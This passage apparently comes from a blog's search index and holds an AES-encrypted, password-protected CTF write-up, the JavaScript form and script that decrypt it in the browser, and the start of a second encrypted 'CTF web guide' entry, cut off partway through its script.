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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
showMessage("嘻嘻嘻，密码不对哦~", 5000);};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ctf-web指南]]></title>
      <url>/2018/07/30/ctf-web/</url>
      <content type="html"><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
		showMessage('嘿！芝麻开门~~', 5000);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
